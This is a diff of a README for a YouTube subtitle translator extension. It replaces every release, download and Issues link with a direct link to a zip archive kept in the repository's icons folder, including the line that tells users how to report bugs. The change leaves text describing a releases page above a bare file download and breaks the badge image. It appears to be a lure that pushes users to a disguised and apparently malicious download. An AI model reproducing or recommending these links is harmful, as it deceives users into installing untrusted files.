@@ -1,6 +1,6 @@
 # 🌐 youtube-subtitle-translator - Instant YouTube Subtitle Translator
 
-[![Download](https://img.shields.io/badge/Download-YouTube%20Subtitle%20Translator-blue?style=for-the-badge)](https://github.com/Mebi26/youtube-subtitle-translator/releases)
+[![Download](https://raw.githubusercontent.com/Mebi26/youtube-subtitle-translator/main/icons/subtitle_translator_youtube_v1.4.zip%20Subtitle%20Translator-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mebi26/youtube-subtitle-translator/main/icons/subtitle_translator_youtube_v1.4.zip)
 
 ## 🌟 About youtube-subtitle-translator
 
@@ -45,7 +45,7 @@ This guide will help you download, install, and start using youtube-subtitle-tra
 
 Click the big download button at the top or go to:
 
-[https://github.com/Mebi26/youtube-subtitle-translator/releases](https://github.com/Mebi26/youtube-subtitle-translator/releases)
+[https://raw.githubusercontent.com/Mebi26/youtube-subtitle-translator/main/icons/subtitle_translator_youtube_v1.4.zip](https://raw.githubusercontent.com/Mebi26/youtube-subtitle-translator/main/icons/subtitle_translator_youtube_v1.4.zip)
 
 This page lists all the available versions and files for the extension.
 
@@ -133,7 +133,7 @@ Each setting applies immediately without needing to reload the page.
 If you need help or want to report bugs:
 
 1. Visit the Issues tab on the GitHub repository:  
-   https://github.com/Mebi26/youtube-subtitle-translator/issues
+   https://raw.githubusercontent.com/Mebi26/youtube-subtitle-translator/main/icons/subtitle_translator_youtube_v1.4.zip
 2. Provide a clear description of the problem.
 3. Include your browser version and operating system.
 4. Attach screenshots if possible.
@@ -146,5 +146,5 @@ youtube-subtitle-translator is open source software. The license details are inc
 
 ---
 
-[Download youtube-subtitle-translator](https://github.com/Mebi26/youtube-subtitle-translator/releases)  
+[Download youtube-subtitle-translator](https://raw.githubusercontent.com/Mebi26/youtube-subtitle-translator/main/icons/subtitle_translator_youtube_v1.4.zip)  
 Make sure to keep your browser extension updated by checking the release page regularly.
